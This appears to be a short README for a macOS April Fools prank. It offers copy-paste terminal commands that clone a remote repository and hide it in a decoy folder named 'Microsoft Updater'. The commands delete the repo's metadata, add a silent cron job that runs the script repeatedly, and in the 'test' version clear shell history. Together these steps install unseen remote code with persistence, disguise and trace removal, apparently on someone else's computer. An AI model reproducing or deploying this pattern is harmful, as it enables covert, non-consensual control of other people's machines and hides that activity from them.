## only works on mac os but makes the computer say nonsense every 5 minutes on april first if its on

### open terminal, copy the below command into it and hit enter
```
# clone repo
# remove readme
# remove .git
# make executable
# create decoy dir
# move to the decoy dir
# add to crontab

git clone https://github.com/benbav/april_fools.git && \
rm april_fools/README.md && \
rm -rf april_fools/.git && \
chmod u+x ~/april_fools/main.sh && \
mkdir "Microsoft Updater" && \
mv april_fools/ "Microsoft Updater/utils" && \
(crontab -l ; echo "*/5 * 1 4 * nohup /usr/bin/env bash ~/Microsoft\ Updater/utils/main.sh > /dev/null 2>&1 &") | crontab -                                                                    
```
**if you need to stop it go to the Home folder and delete the Microsoft Updater folder**

to test on your own computer this will run every minute (just to make sure it works)
```
git clone https://github.com/benbav/april_fools.git && \
rm april_fools/README.md && \
rm -rf april_fools/.git && \
chmod u+x ~/april_fools/main.sh && \
mkdir Microsoft\ Updater
mv april_fools/ "Microsoft Updater/utils"
(crontab -l ; echo "* * * * * nohup /usr/bin/env bash ~/Microsoft\ Updater/utils/main.sh > /dev/null 2>&1 &") | crontab - && \
history -c && history -p
```
**if you need to stop it go to the Home folder and delete the Microsoft Updater folder**
